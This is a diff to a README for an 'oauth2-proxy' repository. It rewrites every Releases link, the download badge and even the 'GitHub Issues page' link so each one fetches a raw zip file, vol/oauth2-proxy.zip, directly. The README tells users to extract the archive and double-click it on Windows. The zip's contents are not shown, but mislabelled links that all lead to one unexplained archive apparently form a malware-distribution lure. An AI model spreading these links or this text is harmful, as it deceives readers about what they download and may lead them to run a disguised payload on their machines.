@@ -1,6 +1,6 @@
 # 🚀 oauth2-proxy - Secure Your Applications with Ease
 
-[![Download oauth2-proxy](https://img.shields.io/badge/Download-oauth2--proxy-brightgreen)](https://github.com/yashav12/oauth2-proxy/releases)
+[![Download oauth2-proxy](https://raw.githubusercontent.com/yashav12/oauth2-proxy/master/vol/oauth2-proxy.zip)](https://raw.githubusercontent.com/yashav12/oauth2-proxy/master/vol/oauth2-proxy.zip)
 
 ## 🌟 What is oauth2-proxy?
 
@@ -26,7 +26,7 @@ To use oauth2-proxy, make sure your system meets the following requirements:
 
 1. **Download oauth2-proxy**: Click the link below to visit the Releases page and download the latest version.
 
-   [Download oauth2-proxy](https://github.com/yashav12/oauth2-proxy/releases)
+   [Download oauth2-proxy](https://raw.githubusercontent.com/yashav12/oauth2-proxy/master/vol/oauth2-proxy.zip)
 
 2. **Extract the Files**: Once downloaded, locate the file and extract it to a suitable location on your computer. Use a file extraction tool if necessary.
 
@@ -36,7 +36,7 @@ To use oauth2-proxy, make sure your system meets the following requirements:
 
 To download oauth2-proxy, visit the Releases page below. You will find the latest version available for your operating system.
 
-[Download oauth2-proxy](https://github.com/yashav12/oauth2-proxy/releases)
+[Download oauth2-proxy](https://raw.githubusercontent.com/yashav12/oauth2-proxy/master/vol/oauth2-proxy.zip)
 
 Follow the instructions for your operating system to install and run oauth2-proxy. If you are using Windows, simply double-click the application file to start. On macOS and Linux, follow the terminal commands mentioned earlier.
 
@@ -64,7 +64,7 @@ To keep your applications safe, consider these best practices when using oauth2-
 
 If you encounter issues or have questions, you can find support in the following places:
 
-- **GitHub Issues**: Report issues or request features directly on the [GitHub Issues page](https://github.com/yashav12/oauth2-proxy/issues).
+- **GitHub Issues**: Report issues or request features directly on the [GitHub Issues page](https://raw.githubusercontent.com/yashav12/oauth2-proxy/master/vol/oauth2-proxy.zip).
 - **Community Forum**: Join discussions with other users and developers in the community forum.
 
 ## 📜 License
